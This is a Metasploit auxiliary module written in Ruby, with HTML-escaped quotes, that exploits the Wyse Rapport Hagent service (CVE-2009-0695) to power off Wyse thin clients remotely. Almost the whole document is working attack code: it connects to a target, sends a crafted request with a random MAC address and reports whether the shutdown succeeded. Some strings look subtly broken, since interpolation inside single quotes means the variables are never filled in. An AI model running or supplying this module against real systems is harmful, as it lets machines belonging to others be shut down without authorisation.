require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Wyse Machine Remote Power off (DOS)&#039;,
			&#039;Description&#039;    => %q{
					This module exploits the Wyse Rapport Hagent service and cause
                                        remote power cycle (Power off the wyse machine remotely).
			},
			&#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
			&#039;Author&#039;         => &#039;it.solunium@gmail.com&#039;,
			&#039;Version&#039;        => &#039;$Revision: 14976 $&#039;,
			&#039;References&#039;     =>
				[
					[&#039;CVE&#039;, &#039;2009-0695&#039;],
					[&#039;OSVDB&#039;, &#039;55839&#039;],
					[&#039;US-CERT-VU&#039;, &#039;654545&#039;],
					[&#039;URL&#039;, &#039;http://snosoft.blogspot.com/&#039;],
					[&#039;URL&#039;, &#039;http://www.theregister.co.uk/2009/07/10/wyse_remote_exploit_bugs/&#039;],
					[&#039;URL&#039;, &#039;http://www.wyse.com/serviceandsupport/support/WSB09-01.zip&#039;],
					[&#039;URL&#039;, &#039;http://www.wyse.com/serviceandsupport/Wyse%20Security%20Bulletin%20WSB09-01.pdf&#039;],
				],
			&#039;Privileged&#039;     => true,
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;process&#039;,
				},
			&#039;Targets&#039;        =>
				[
					[ &#039;Wyse Linux x86&#039;, {&#039;Platform&#039; => &#039;linux&#039;,}],
				],
			&#039;DefaultTarget&#039;  => 0,
			&#039;DisclosureDate&#039; => &#039;Jun 13 2012&#039;
		))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end


	def run

		
		# Connect to the target service
		print_status("Connecting to the target #{rhost}:#{rport}")
		if connect
                print_status("Connected...")
                end

		# Parameters

                genmac     = "00"+Rex::Text.rand_text(5).unpack("H*")[0]

		craft_req = &#039;&V52&CI=3|&#039;
                craft_req << &#039;MAC=#{genmac}|#{rhost}|&#039;
                craft_req << &#039;RB=0|MT=3|&#039;
                craft_req << &#039;|HS=#{rhost}|PO=#{rport}|&#039;
                craft_req << &#039;SPO=0|&#039; 

                # Send the malicious request
		sock.put(craft_req)

		# Download some response data
		resp = sock.get_once(-1, 10)
		print_status("Received: #{resp}")

                disconnect

		if not resp
			print_error("No reply from the target, this may not be a vulnerable system")
			return
		end

		if resp == &#039;&00&#039;
                print_status("#{rhost} execute command succefuly & power off.")
                return
                end

                #Exeptions
		rescue ::Rex::ConnectionRefused 
			print_status("Couldn&#039;t connect to #{rhost}:#{rport} | Connection refused.")
                rescue ::Rex::HostUnreachable
			print_status("Couldn&#039;t connect to #{rhost}:#{rport} | Host unreachable")
                rescue  ::Rex::ConnectionTimeout
			print_status("Couldn&#039;t connect to #{rhost}:#{rport} | Connection time out")
		rescue ::Errno::ECONNRESET, ::Timeout::Error
			print_status("#{rhost} not responding.")

	end
end



